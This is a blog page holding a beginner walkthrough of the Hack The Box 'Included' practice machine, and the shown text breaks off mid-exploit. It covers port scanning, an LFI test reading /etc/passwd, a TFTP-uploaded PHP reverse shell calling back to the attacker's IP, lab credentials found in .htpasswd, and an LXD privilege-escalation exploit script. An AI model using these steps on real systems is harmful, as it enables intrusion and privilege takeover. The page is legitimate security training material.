<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Included - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,included,tier-2,vip-tier,php,web,network,custom-applications,protocols,apache,tftp,lxd,reconnaissance,local-file-inclusion,clear-text-credentials,arbitrary-file-upload,linux-target,easy-box,user-own,system-own"><meta name=description content="The aim of this walkthrough is to provide help with the Included machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/included/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/48x48.svg><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/16x16_white.svg><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/32x32_white.svg><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/180x180_white.svg><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Included - Walkthrough"><meta property="og:description" content="The aim of this walkthrough is to provide help with the Included machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/included/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-23T10:00:00+00:00"><meta property="article:modified_time" content="2023-05-23T10:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Included - Walkthrough"><meta name=twitter:description content="The aim of this walkthrough is to provide help with the Included machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
SETUP There are a couple of ways to connect to the target machine."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Included - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/included/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Included - Walkthrough","name":"HTB - Included - Walkthrough","description":"The aim of this walkthrough is to provide help with the Included machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.\nSETUP There are a couple of ways to connect to the target machine.","keywords":["htb","walkthrough","included","tier-2","vip-tier","php","web","network","custom-applications","protocols","apache","tftp","lxd","reconnaissance","local-file-inclusion","clear-text-credentials","arbitrary-file-upload","linux-target","easy-box","user-own","system-own"],"articleBody":"The aim of this walkthrough is to provide help with the Included machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.\nSETUP There are a couple of ways to connect to the target machine. The one we will be using throughout this walkthrough is via the provided pwnbox.\nOnce our connection is taken care of, we spawn the target machine.\nAdditionally - even though not required - it is possible to set a local variable (only available in the current shell) containing our target host’s IP address. Once set, we can easily access it by prepending a $ to our variable name.\n┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $rhost= ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ echo $rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ We could use the unset command to remove it after we no longer need it.\n┌─[✗]─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $unset rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ TASK 1 Question: What service is running on the target machine over UDP?\nOur recon phase starts with a quick connection check\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ ping $rhost -c 4 PING 10.129.112.221 (10.129.112.221) 56(84) bytes of data. 64 bytes from 10.129.112.221: icmp_seq=1 ttl=63 time=10.6 ms 64 bytes from 10.129.112.221: icmp_seq=2 ttl=63 time=9.81 ms 64 bytes from 10.129.112.221: icmp_seq=3 ttl=63 time=10.3 ms 64 bytes from 10.129.112.221: icmp_seq=4 ttl=63 time=10.2 ms --- 10.129.112.221 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3005ms rtt min/avg/max/mdev = 9.811/10.259/10.649/0.299 ms ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ followed by the usual (version, script, top1000-ports) tcp nmap scan.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ nmap -sC -sV $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 15:03 BST Nmap scan report for 10.129.112.221 Host is up (0.050s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Site doesn't have a title (text/html; charset=UTF-8). |_Requested resource was http://10.129.112.221/?file=home.php Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.56 seconds ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ It looks like our target is running a web server on port 80. Let’s get a fingerprint on the website.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ whatweb $rhost http://10.129.112.221 [302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.112.221], RedirectLocation[http://10.129.112.221/index.php?file=home.php] http://10.129.112.221/index.php?file=home.php [301 Moved Permanently] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.112.221], RedirectLocation[http://10.129.112.221/?file=home.php], Title[301 Moved Permanently] http://10.129.112.221/?file=home.php [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.112.221] ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ Interestingly enough, there are two redirections in place:\n0 - http://$rhost - landing page 1 - http://$rhost/index.php?file=home.php - first redirect 2 - http://$rhost/?file=home.php - second redirect Anyway, these urls seem quite dangerous with that file parameter, but let’s leave that for later. For now, since the question mentions udp ports, let’s scan those port’s too. (Note: scanning the udp ports on the target requires root privileges)\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ sudo nmap -sU --min-rate 5000 -p- $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 15:04 BST Warning: 10.129.112.221 giving up on port because retransmission cap hit (10). Nmap scan report for 10.129.112.221 Host is up (0.059s latency). Not shown: 65350 open|filtered udp ports (no-response), 175 closed udp ports (port-unreach) PORT STATE SERVICE 39623/udp open unknown 47052/udp open unknown 54212/udp open unknown 54319/udp open unknown 55618/udp open unknown 57357/udp open unknown 57647/udp open unknown 58096/udp open unknown 60359/udp open unknown 60980/udp open unknown Nmap done: 1 IP address (1 host up) scanned in 169.70 seconds ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ That’s not too encouraging… How about if we stick to only the most common ports?\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ sudo nmap -sU $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 15:34 BST Stats: 0:03:18 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 20.98% done; ETC: 15:49 (0:12:26 remaining) Stats: 0:09:32 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 58.00% done; ETC: 15:50 (0:06:55 remaining) Nmap scan report for 10.129.112.221 Host is up (0.011s latency). Not shown: 998 closed udp ports (port-unreach) PORT STATE SERVICE 68/udp open|filtered dhcpc 69/udp open|filtered tftp Nmap done: 1 IP address (1 host up) scanned in 1024.02 seconds ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ That’s much better. But what exactly are those two services? After a quick research, this is the information we end up with:\ndhcpc port 68 – probably a dhcp client tftp port 69 – trivial file transfer protocol – no user authentication!!! That second part looks extremely promising. Let’s check it out…only how can we do that?\nA quick online search (again) lands as with the tftp-enum script which is available for nmap. It also mentions that it’s only a reimplementation of tftptheft tool, and by following the provided link we can download a wordlist containing the most commonly used filenames that can be found on a tftp share.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ wget https://raw.githubusercontent.com/EnableSecurity/tftptheft/master/data/tftplist.txt --2023-05-23 15:53:36-- https://raw.githubusercontent.com/EnableSecurity/tftptheft/master/data/tftplist.txt Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ... Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected. HTTP request sent, awaiting response... 200 OK Length: 1420 (1.4K) [text/plain] Saving to: ‘tftplist.txt’ tftplist.txt 100%[===============================\u003e] 1.39K --.-KB/s in 0s 2023-05-23 15:53:36 (20.1 MB/s) - ‘tftplist.txt’ saved [1420/1420] ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ ll total 4.0K -rw-r--r-- 1 htb-bluewalle htb-bluewalle 1.4K May 23 15:53 tftplist.txt ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ Sadly, the enumeration does not find anything interesting. Be it because the share is empty or because file discovery is blocked. We do not know.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ sudo nmap -sU -p 69 --script tftp-enum.nse --script-args tftp-enum.filelist=tftplist.txt $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-23 15:56 BST Nmap scan report for 10.129.112.221 Host is up (0.053s latency). PORT STATE SERVICE 69/udp open tftp Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ But since that was a bust, let’s try something else. A quick online research steers us towards a tool named tftp. But since it does not come preinstalled on the pwnbox, we will have to install it ourselves.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ apropos tftp tftp: nothing appropriate. ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ sudo apt install tftp Reading package lists... Done Building dependency tree... Done Reading state information... Done The following NEW packages will be installed: tftp 0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded. Need to get 19.3 kB of archives. After this operation, 54.3 kB of additional disk space will be used. Get:1 https://deb.parrot.sh/parrot parrot/main amd64 tftp amd64 0.17-23 [19.3 kB] Fetched 19.3 kB in 0s (60.2 kB/s) Selecting previously unselected package tftp. (Reading database ... 506084 files and directories currently installed.) Preparing to unpack .../tftp_0.17-23_amd64.deb ... Unpacking tftp (0.17-23) ... Setting up tftp (0.17-23) ... Processing triggers for man-db (2.10.1-1~bpo11+1) ... Scanning application launchers Removing duplicate launchers or broken launchers Launchers are updated ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ Once installed, we refer to it’s man page for further information about it’s usage (man tftp). Simply connecting to our target does not reveal anything interesting.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ tftp $rhost tftp\u003e status Connected to 10.129.112.221. Mode: netascii Verbose: off Tracing: off Rexmt-interval: 5 seconds, Max-timeout: 25 seconds tftp\u003e ^C tftp\u003e ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ Coupled with the fact that there is no trivial way to simply dump the file list via tftp, we will probably have to resort to it’s (unauthenticated) file upload function.\nAs for the answer, since we are restricted to a 4 character long string, we have a clear winner with tftp.\ntftp\nTASK 2 Question: What class of vulnerability is the webpage that is hosted on port 80 vulnerable to?\nIt is time to check out the webpage that our target is hosting. Once we fire up our browser, we are automatically redirected to - http://$rhost/?file=home.php -. Goofing around a bit, we notice, that all the links point back to the same landing page.\nUsing the Wappalyzer Firefox Extension we collect the following information:\nFront scripts: Google Font API Web servers: Apache HTTP Server - 2.4.29 Programming languages: php Operating systems: Ubuntu Maybe it can be of interest later on. But for now, it’s time to return to the dangerous url that we are served with.\nSearching for something like - file= vulnerability - lands us the clear answer. But is it really vulnerable? One of the typical proof-of-concept way to test it is to try and load the passwd file with the - ../../../../etc/passwd - path. (Note: this file should be accessible for all the users on the system.)\nAccessing the endpoint using our browser provides us with the passwd file, ergo, our target is indeed vulnerable to LFI.\nlocal file inclusion\nTASK 3 Question: What is the default system folder that TFTP uses to store files?\nBuilding on the information obtained in TASK1 and TASK2, our idea is to use tftp to upload a php reverse shell and then use the file url parameter to run it.\nBut for that, we need to know exactly where our files will end up once we upload them via tftp. A quick internet search rewards us with default root directory path, - /var/lib/tftpboot -.\nLet’s try and enumerate that directory.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ gobuster dir -u http://$rhost/?file=/var/lib/tftpboot/ -w /opt/useful/SecLists/Discovery/Web-Content/tftp.fuzz.txt --exclude-length 0 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.112.221/?file=/var/lib/tftpboot/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/useful/SecLists/Discovery/Web-Content/tftp.fuzz.txt [+] Negative Status codes: 404 [+] Exclude Length: 0 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/05/23 16:38:43 Starting gobuster in directory enumeration mode =============================================================== =============================================================== 2023/05/23 16:38:44 Finished =============================================================== ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ No luck with the tftp.fuzz.txt wordlist. Let’s try the common one.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ gobuster dir -u http://$rhost/?file=/var/lib/tftpboot/ -w /usr/share/wordlists/dirb/common.txt --exclude-length 0 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.129.112.221/?file=/var/lib/tftpboot/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/common.txt [+] Negative Status codes: 404 [+] Exclude Length: 0 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2023/05/23 16:39:44 Starting gobuster in directory enumeration mode =============================================================== /Documents and Settings (Status: 400) [Size: 301] /Program Files (Status: 400) [Size: 301] /reports list (Status: 400) [Size: 301] =============================================================== 2023/05/23 16:39:49 Finished =============================================================== ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ Again, no luck this time. We move on.\n/var/lib/tftpboot/\nTASK 4 Question: Which interesting file is located in the web server folder and can be used for Lateral Movement?\nNow it’s finally time to get that reverse php shell going. We grab one of the most commonly used ones and we modify it to fit our needs.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php --2023-05-23 16:52:12-- https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ... Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected. HTTP request sent, awaiting response... 200 OK Length: 5491 (5.4K) [text/plain] Saving to: ‘php-reverse-shell.php’ php-reverse-shell.php 100%[===============================\u003e] 5.36K --.-KB/s in 0s 2023-05-23 16:52:12 (42.5 MB/s) - ‘php-reverse-shell.php’ saved [5491/5491] ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ vim php-reverse-shell.php ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ mv php-reverse-shell.php revshell.php ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ We adjust line 49 and 50 accordingly.\n# original ... $ip = '127.0.0.1'; // CHANGE THIS $port = 1234; // CHANGE THIS ... # modified ... $ip = '10.10.14.75'; // local host $port = 4444; // arbitrary port ... Once uploaded,\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ tftp $rhost tftp\u003e put revshell.php Sent 5685 bytes in 0.2 seconds tftp\u003e ^C tftp\u003e ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ and with a netcat listener started in an other terminal,\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/Desktop] └──╼ [★]$ nc -lvnp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 all that’s left to do is to access it so that our target runs it. We can do this by simply loading our script in our browser via - http://$rhost/?file=/var/lib/tftpboot/revshell.php -.\nHeading over to our netcat listener, we are welcomed with a shell access with the privileges of the www-data user.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/Desktop] └──╼ [★]$ nc -lvnp 4444 Ncat: Version 7.93 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.129.112.221. Ncat: Connection from 10.129.112.221:56704. Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux 16:03:41 up 2:01, 0 users, load average: 0.00, 0.00, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) /bin/sh: 0: can't access tty; job control turned off But since this shell connection is quite unstable, we first stabilize it.\n$ which python $ which python3 /usr/bin/python3 $ python3 -c 'import pty; pty.spawn(\"/bin/bash\")' www-data@included:/$ export TERM=xterm export TERM=xterm www-data@included:/$ ^Z [1]+ Stopped nc -lvnp 4444 ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/Desktop] └──╼ [★]$ stty raw -echo; fg nc -lvnp 4444 www-data@included:/$ Looking around a bit, we realize that we do NOT have permission to view the user flag.\nwww-data@included:/$ pwd / www-data@included:/$ ls -hla total 100K drwxr-xr-x 24 root root 4.0K Oct 11 2021 . drwxr-xr-x 24 root root 4.0K Oct 11 2021 .. drwxr-xr-x 2 root root 4.0K Jul 26 2021 bin drwxr-xr-x 3 root root 4.0K Oct 11 2021 boot drwxr-xr-x 2 root root 4.0K Apr 23 2021 cdrom drwxr-xr-x 17 root root 3.9K May 23 14:01 dev drwxr-xr-x 98 root root 4.0K Jul 26 2021 etc drwxr-xr-x 3 root root 4.0K Mar 5 2020 home lrwxrwxrwx 1 root root 34 Jul 26 2021 initrd.img -\u003e boot/initrd.img-4.15.0-151-generic lrwxrwxrwx 1 root root 34 Oct 11 2021 initrd.img.old -\u003e boot/initrd.img-4.15.0-151-generic drwxr-xr-x 21 root root 4.0K Jul 26 2021 lib drwxr-xr-x 2 root root 4.0K Jul 26 2021 lib64 drwx------ 2 root root 16K Mar 5 2020 lost+found drwxr-xr-x 2 root root 4.0K Apr 23 2021 media drwxr-xr-x 2 root root 4.0K Aug 5 2019 mnt drwxr-xr-x 2 root root 4.0K Apr 23 2021 opt dr-xr-xr-x 134 root root 0 May 23 14:01 proc drwx------ 7 root root 4.0K Apr 23 2021 root drwxr-xr-x 25 root root 880 May 23 14:02 run drwxr-xr-x 2 root root 12K Jul 26 2021 sbin drwxr-xr-x 4 root root 4.0K Apr 23 2021 snap drwxr-xr-x 2 root root 4.0K Apr 23 2021 srv dr-xr-xr-x 13 root root 0 May 23 14:01 sys drwxrwxrwt 2 root root 4.0K May 23 14:02 tmp drwxr-xr-x 11 root root 4.0K Jul 26 2021 usr drwxr-xr-x 14 root root 4.0K Apr 23 2021 var lrwxrwxrwx 1 root root 31 Jul 26 2021 vmlinuz -\u003e boot/vmlinuz-4.15.0-151-generic lrwxrwxrwx 1 root root 31 Oct 11 2021 vmlinuz.old -\u003e boot/vmlinuz-4.15.0-151-generic www-data@included:/$ cd home/ www-data@included:/home$ ls -hla total 12K drwxr-xr-x 3 root root 4.0K Mar 5 2020 . drwxr-xr-x 24 root root 4.0K Oct 11 2021 .. drwxr-xr-x 6 mike mike 4.0K Mar 11 2020 mike www-data@included:/home$ cd mike/ www-data@included:/home/mike$ ls -hlag total 44K drwxr-xr-x 6 mike 4.0K Mar 11 2020 . drwxr-xr-x 3 root 4.0K Mar 5 2020 .. lrwxrwxrwx 1 mike 9 Mar 5 2020 .bash_history -\u003e /dev/null -rw-r--r-- 1 mike 220 Apr 4 2018 .bash_logout -rw-rw-r-- 1 mike 15 Mar 5 2020 .bash_profile -rw-r--r-- 1 mike 3.7K Apr 4 2018 .bashrc drwx------ 2 mike 4.0K Mar 5 2020 .cache drwxr-x--- 3 mike 4.0K Mar 10 2020 .config drwx------ 3 mike 4.0K Mar 5 2020 .gnupg drwxrwxr-x 3 mike 4.0K Mar 9 2020 .local -rw-r--r-- 1 mike 807 Apr 4 2018 .profile -r-------- 1 mike 33 Mar 9 2020 user.txt www-data@included:/home/mike$ Therefore, we need upgrade our privileges. Taking a quick look at the web server’s installation directory can sometimes lead to lateral movement, considering, that quite often the source files found there are prone to leak some clear-text credentials.\nwww-data@included:/var/www/html$ ls -hlag total 88K drwxr-xr-x 4 root 4.0K Oct 13 2021 . drwxr-xr-x 3 root 4.0K Apr 23 2021 .. -rw-r--r-- 1 www-data 212 Apr 23 2021 .htaccess -rw-r--r-- 1 www-data 17 Apr 23 2021 .htpasswd -rw-r--r-- 1 www-data 14K Apr 29 2014 default.css drwxr-xr-x 2 www-data 4.0K Apr 23 2021 fonts -rw-r--r-- 1 www-data 20K Apr 29 2014 fonts.css -rw-r--r-- 1 www-data 3.7K Oct 13 2021 home.php drwxr-xr-x 2 www-data 4.0K Apr 23 2021 images -rw-r--r-- 1 www-data 145 Oct 13 2021 index.php -rw-r--r-- 1 www-data 17K Apr 29 2014 license.txt www-data@included:/var/www/html$ We are lucky. The .htpasswd file which is used to store usernames and passwords for basic HTTP authentication contains a password for the mike user.\nwww-data@included:/var/www/html$ cat .htaccess RewriteEngine On RewriteCond %{THE_REQUEST} ^GET.*index\\.php [NC] RewriteRule (.*?)index\\.php/*(.*) /$1$2 [R=301,NE,L] # #AuthType Basic #AuthUserFile /var/www/html/.htpasswd #Require valid-user www-data@included:/var/www/html$ cat .htpasswd mike:Sheffield19 www-data@included:/var/www/html$ Since password reuse is a common thing, we try the same password on the system.\nwww-data@included:/var/www/html$ su mike Password: mike@included:/var/www/html$ Great, it worked!\n.htpasswd\nTASK 5 Question: What is the group that user Mike is a part of and can be exploited for Privilege Escalation?\nFirst we list all the groups that mike is a member of. There are only two: mike and lxd.\nmike@included:/var/www/html$ groups mike lxd mike@included:/var/www/html$ id uid=1000(mike) gid=1000(mike) groups=1000(mike),108(lxd) mike@included:/var/www/html$ A quick online search reveals LXD as a next generation system container and virtual machine manager. That looks promising.\nBut before we continue with exploiting lxd we make sure to grab the user flag.\nmike@included:/var/www/html$ cat /home/mike/user.txt mike@included:/var/www/html$ lxd\nTASK 6 Question: When using an image to exploit a system via containers, we look for a very small distribution. Our favorite for this task is named after mountains. What is that distribution name?\nThis time we rely on the exploit database for finding the exploit. We grab it and store it in our working directory.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ searchsploit lxd -------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------- --------------------------------- Ubuntu 18.04 - 'lxd' Privilege Escalation | linux/local/46978.sh -------------------------------------------------------------- --------------------------------- Shellcodes: No Results ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ cp /usr/share/exploitdb/exploits/linux/local/46978.sh . ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ mv 46978.sh lxdprivesc.sh ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ Opening it, we are welcomed with clear instructions and following them should elavate our privileges to root.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.75]─[htb-bluewalle@htb-kncdaw3dhs]─[~/included] └──╼ [★]$ cat lxdprivesc.sh #!/usr/bin/env bash # ---------------------------------- # Authors: Marcelo Vazquez (S4vitar) #\tVictor Lasa (vowkin) # ---------------------------------- # Step 1: Download build-alpine =\u003e wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine] # Step 2: Build alpine =\u003e bash build-alpine (as root user) [Attacker Machine] # Step 3: Run this script and you will get root [Victim Machine] # Step 4: Once inside the container, navigate to /mnt/root to see all resources 